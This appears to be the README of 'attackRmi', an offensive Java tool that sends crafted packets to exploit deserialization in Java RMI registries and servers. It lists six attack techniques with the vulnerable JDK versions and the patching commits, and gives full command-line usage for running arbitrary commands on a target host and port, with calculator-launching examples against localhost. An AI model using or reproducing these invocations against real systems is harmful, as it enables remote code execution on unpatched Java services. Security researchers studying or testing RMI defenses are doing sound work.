# attackRmi

This project uses the socket to send packets directly to attack rmi. The following jdk version refers to the version of openjdk

The following methods attack rmi by deserialization, so the following 6 attack methods require the local classpath to contain gadgets

## AttackRegistryByBindAndAnnotationInvocationHandler

This is actually the RMIRegistryExploit of ysoserial.

condition:

- <jdk8u121

https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/75f31e0bd829/

## AttackRegistryByDGC

condition:

- <jdk8u121

https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/75f31e0bd829/

## AttackRegistryByLookup

condition:

- <jdk8u121

https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/75f31e0bd829/

## AttackRegistryByLookupAndUnicastRef

condition:

- <jdk8u232

https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/523d48606333/

## AttackRegistryByLookupAndUnicastRefRemoteObject

condition:

- <jdk8u242

https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/033462472c28

## AttackServerByNonPrimitiveParameter

condition:

- <jdk8u242
  -Types other than primitive tyep can be used
- \>= jdk8u242
  -Types other than primitive type and String can be used

https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/033462472c28

## Usage
```
ByDGC OR ByLookup
Usage: java -jar attackRmi.jar DOL [registryHost] [registryPort] '[command]'

ByLookupAndUnicastRef OR ByLookupAndUnicastRefRemoteObject
Usage: java -jar attackRmi.jar LAU [registryHost] [registryPort] [JRMPListenHost] [JRMPListenPort]
Usage: java -jar attackRmi.jar LAUS [registryHost] [registryPort] [serverIp] [startPort] '[command]' (run at server)

ByNonPrimitiveParameter
Usage: java -jar attackRmi.jar NPP [registryHost] [registryPort] [name] '[methodSignature]' '[command]'

AttackRegistryByDGC
Usage: java -cp attackRmi.jar com.wu.attackRmi.Exploit.AttackRegistryByDGC [registryHost] [registryPort] [payload] '[command]'

AttackRegistryByLookup
Usage: java -cp attackRmi.jar com.wu.attackRmi.Exploit.AttackRegistryByLookup [registryHost] [registryPort] [payload] '[command]'

AttackRegistryByLookupAndUnicastRef
Usage: java -cp attackRmi.jar com.wu.attackRmi.Exploit.AttackRegistryByLookupAndUnicastRef [registryHost] [registryPort] [JRMPListenHost] [JRMPListenPort]

AttackRegistryByLookupAndUnicastRefRemoteObject
Usage: java -cp attackRmi.jar com.wu.attackRmi.Exploit.AttackRegistryByLookupAndUnicastRefRemoteObject [registryHost] [registryPort] [JRMPListenHost] [JRMPListenPort]

AttackServerByNonPrimitiveParameter
Usage: java -cp attackRmi.jar com.wu.attackRmi.Exploit.AttackServerByNonPrimitiveParameter [registryHost] [registryPort] [name] '[methodSignature]' [payloadType] '[command]'
```
example
- `java -jar attackRmi.jar DOL 127.0.0.1 1099 'open /System/Applications/Calculator.app'`
- `java -jar attackRmi.jar LAUS 127.0.0.1 1099 127.0.0.1 10000 'open /System/Applications/Calculator.app'`
- `java -jar attackRmi.jar LAU 127.0.0.1 1099 127.0.0.1 10000`
- `java -jar attackRmi.jar NPP 127.0.0.1 1099 hello 'sayHello(Ljava/lang/String;)Ljava/lang/String;' 'open /System/Applications/Calculator.app'`

For method signature, you can refer to https://stackoverflow.com/questions/8066253/compute-a-java-functions-signature

## TODO

- [x] attackRMI.jar
- [x] brute force gadget
- [ ] brute method